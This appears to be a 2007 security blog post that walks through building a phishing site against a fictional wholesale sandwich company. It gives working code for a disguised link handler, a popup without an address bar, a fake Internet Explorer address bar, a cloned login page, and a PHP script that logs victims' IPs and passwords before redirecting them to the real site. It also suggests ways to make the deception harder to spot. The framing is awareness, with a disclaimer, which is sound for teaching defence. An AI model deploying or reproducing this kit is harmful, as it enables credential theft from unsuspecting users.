---
title: The anatomy of a phishing attack - advanced technique
date: 2007-07-12
tag:
- security
---
So many phishing attempts lately are just purely pathetic - easy to guess and figure out, mis spelling and grammar issues and just poorly fashioned websites.  Although these will work on the novice web surfer, can a clever criminal actually create a phishing site/scenario that can trap the experienced members in your IT department?  

<!--more-->

In this article we're going to take apart a phishing proof of concept attempt I created at ("the triangle") (for privacy sake, however, I'm going to use another fake company as the example) which fooled (or at least surprised a good portion of the IT staff I showed it too).

I leaped ahead with my phishing example.  I didn't take the time to create a fake phishing e-mail to my target.  Instead, I just told them about the URL -- they knew they were on a proof of concept, so they were willing to visit my website.  Our main company is wholesale peanut butter and jelly sandwiches with a website at `wholesalepbj.com`.  My 'fake' URL that I provided the target with was from an e-mail from `sales@wholesalepbj.com` which told them about a new promotion we were running.  It told them to go to `diamondquality-wholesalepbj.com` for our "Diamond Quality" sale.  All they had to do was log in and get the discount.

I visited `wholesalepbj.com` and collected some key images such as the logo and a few stock photos.  I also noted their font styles and colors and their marketing type of wording.  `diamondquality-wholesalepbj.com`, on my evil server, created one marketing page talking about this amazing, yet believable sale we were running.  I then had a link that said "Click this link to go to our homepage and claim your sale promotion".  This is where the 'evil' started.

This link contained this code:

```html
<em>You are almost there!</em>  
Just click 
<a href="http://www.wholesalepbj.com" onclick="return openPBJ()">this link</a>
```

Just in case our security professional took a quick look at the code, I wanted to make sure it at least looked 'ok'... hence the name seems "innocent" enough.

This is the javascript code:

```javascript
function openPBJ() {
  window.open("redirectToPBJ.html", "PBJWindow",
              "status=0,toolbar=0,location=0,left=1,top=1,height=" 
              + screen.height + ",width=1010"
             );
  return false;
}
```

Now those clever fellows of us are starting to see where I'm going with this.  First off, we have a link that is pointing to the real website but has a javascript handler.  Our function returns `false` so we never go to the URL.  Interesting to note, in both FF2 and IE6/7, when you right click on the link and choose properties (or mouse over for that matter), it shows its source as the real website with no mention about the javascript obstructing the URL).  Finally, in this bit of code, we see a lot of 'naming' that we're using to hopefully throw off the user.  We 'redirect' to `pbj`, we name it `pbjwindow`, etc.  You'll notice the only suspect thing is `location=0` in our window popup.  On most browsers, this is going to allow us to open this window without an address bar.

At this point, I had thought about being done here... but I know that people are training themselves to look for the URL in the address bar now.  If I launched a popup window with no address bar, people might become suspicious.  So I needed to have an address bar... - or at least something that looks like one.

**`redirectToPBJ.html`**
```html
<html>
  <title>http://www.wholesalepbj.com</title>
  <frameset rows="27,*" border=0 frameborder=0>
    <frame src="top.html" scrolling='no' frameborder='0' noresize></frame>
    <frame src="www.wholesalepbj.com.html" name='pbj' scrolling='yes' frameborder='0' noresize></frame>
  </frameset>
</html>
```

If the user actually looked at the code, this page becomes more suspect.  But note, still using our misdirection, we do have the source pointing to `www.wholesalepbj.com.html`.  You may know that that still an html file, but a quick observer might miss that.  Ok, so this content was loaded into the popup window - even the title bar shows our website address.  We're done creating our frames (with no borders and resizing options).

Lets check out the **`top.html`** file.  This is responsible for our address bar.  I made an assumption that the user would be using Internet Explorer.  I made this proof of concept when Internet Explorer 6 was still the default, so the interface may look a little bit different now.  Also, if the user had a different version of windows or a non-classic theme, the address bar may not look like their standard address bar.  But, this is besides the point: our proof of concept was against Internet Explorer 6 with no theme.  

**`top.html`**
```html
<style type="text/css">
  body {
    margin: 0px;
    padding: 0px;
    background-color: #d4d0c8;
    font-family: tahoma;
    font-size: 11px;
    border-top: 1px solid #ffffff;
    border-bottom: 1px solid #aaaaaa;
    vertical-align: middle;
  }

  #address {
    float: left;
    height: 35px;
    padding: 3px;
  }

  #addressbox {
    width: 910px;
  }

  #gobutton {
    background-image: url('go.jpg');
    background-repeat: no-repeat;
    border: 0px;
    padding-left: 17px;
  }
  </style>
  <script type="text/javascript">
    function gotoAddress()
    {
      var v= document.getElementById('addressbox').value;
      if (v.substr(0, 7) != 'http://') {
        v = 'http://' + v;
      }
      top.opener.location.href=v;
      parent.window.close();
      return false;
    }
  </script>

  <p id="address">Address</p>
  <p id="box">
  <form name="address" action="/" onsubmit="return gotoAddress()">
    <input id="addressbox" value="http://www.wholesalepbj.com?promo=TRUE" type="text" />
    <input value="Go" id="gobutton" type="submit" />
  </form>
</p>
```

This is an interesting piece of code.  First off, lets start with what we know.  We know we need and address bar that they're used to seeing - but it has to have the website they expect to be visiting's URL in itself.  It also should function like a normal address bar (It shouldn't just be a picture, it should allow for users to type in it and possibly navigate away from our site.).

The first CSS styles the address bar like our classic theme would.  The **`go.jpg`** is actually an image of the go button we normally see: ![go.jpg](/uploads/2007/go.jpg)

The address bar itself is an input field, and its populated with our proper website URL.  It even has a note in their about this being a promotion, so the user may think that they are logging in to get their sale and discount.  On submit ('enter'), we return the value from the javascript function.  As we had learned earlier, we can always stop something on our website by returning false - so the form field never is submitted because our javascript returns false.

Our javascript reads in the value from the address bar.  If the user did not enter an `http://`, it adds it to the beginning of whatever they entered for them.  Then, the javascript redirects the parent to the URL they entered and closes itself.  Obviously this will look a little strange to the user - why did they type in the URL and the window closes, but we're fine with this for two reasons: 1) most users probably will just think it was a weird quirk with the browser and 2) if we're leaving our phished site, we need to provide a real functional address bar.

So we've solved our address bar issue, lets move on to spoofing the real website.

I simply went to `wholesalepbj.com` in my browser and did a file -> save as - and saved the entire web page and archive named `www.wholesalepbj.com.html`.  I uploaded this to my evil server as well.  It had to be named this so we could support the `src` attribute in our framed document **`top.html`**'s source.

Next, we edited the content of my saved copy of the website.  I changed the login form's URL to point to a page on my evil website which will log their username and password.  If the user clicks any other link besides logging in, they will bust us - they'll go to the real website... but the 'address bar' will stay the same.  (In hindsight, I should have modified the original website's code from wholesalepbj.com that I saved to make it easier to login and encourage them to get their promotion...)  These changes were simple and easy.  (Also, keep in mind, if the user looked at the source of our document, they're gonna see our frame source, not our saved version of the website's source - which could give it away.  They would have to choose a different option to actually see the real source of the saved website).

Lets take a look at what happens when the user logs in.  First off, I changed the input form field to submit to my server's version of login.php.  It contains this code:

```html
<?php
//log all of the information.
$f = fopen('test.txt', 'a');
fwrite(
  $f, 
  "----------------------------\nip: " 
    . $_SERVER['REMOTE_ADDR'] . "n" 
    . print_r($_POST, TRUE)
);
fclose($f);
?>
<script type="text/javascript">
  parent.window.location.href="http://www.wholesalepbj.com/login.php";
</script>
```

First off, the script takes care of logging the user credentials (obviously, in production, I'd be writing this to a database... but this shows a good enough example right now.  Then the page loads, and executes javascript right away, which sets and focuses the parent window's location (parent being this popup - remember, we're in frames). to the real website's login page - but not passing any credentials.  Then the user is on the real website and the damage has been done - we have their credentials.

This was just a 'quick and dirty' proof of concept I did.  There are far more ways to make it more complex, more accurate and more streamlined... (think using hidden iframes to actually login the user to the website, then redirect them to the website after a short break...).  But the proof of concept is successful - there are some phishing situations that would work against even the best and brightest of us.

I should also state that I do not endorse creating phishing websites - its both illegal and unethical.  I will not help anyone create one - I will answer technical questions about my proof of concept's implementation, however.